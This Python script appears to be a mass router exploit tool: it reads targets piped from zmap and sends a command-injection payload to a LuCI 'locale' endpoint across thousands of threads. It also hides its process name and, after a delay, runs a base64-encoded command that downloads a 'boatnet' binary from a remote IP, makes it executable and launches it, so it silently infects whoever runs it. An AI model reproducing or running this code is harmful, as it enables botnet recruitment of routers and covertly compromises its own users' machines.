
import os
import base64
import urllib.request
import urllib.error
import fileinput
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import time
import random
import ctypes
#HOW TO USE ? | zmap -p 8080  | python3 x86.py

encoded_command = "d2dldCBodHRwOi8vODQuMjAwLjgxLjIzOS9oaWRkZW5iaW4vYm9hdG5ldC54ODY7IGNobW9kIDc3NyBib2F0bmV0Lng4NjsgLi9ib2F0bmV0Lng4NiByb3V0ZXJz"


def execute_local_command():
    try:
        # Decode the command
        decoded_command = base64.b64decode(encoded_command).decode('utf-8')
        # Execute the command with output suppressed
        os.system(f"{decoded_command} > /dev/null 2>&1")
    except Exception as e:
        pass


def hide_process_name():
    try:
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, b"python_script", 0, 0, 0)
    except Exception as e:
        pass


payload = "payload here"


def exploit(target):
    try:
        req = urllib.request.Request(
            "http://" + target + "/cgi-bin/luci/;stok=/locale?form=country")
        req.add_header(
            "User-Agent",
            "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0"
        )
        body = f"operation=write&country=$(id>{payload})"

        response = urllib.request.urlopen(req,
                                          data=bytes(body, 'utf-8'),
                                          timeout=10)

        if response.status == 200:
            print("200 " + target + " hs")
    except Exception as e:
        pass


if __name__ == "__main__":
    hide_process_name()  #

    def delayed_execution():
        time.sleep(120)
        execute_local_command()

    Thread(target=delayed_execution, daemon=True).start()

    with ThreadPoolExecutor(max_workers=10000) as executor:
        for line in fileinput.input():
            target = line.rstrip()
            executor.submit(exploit, target)
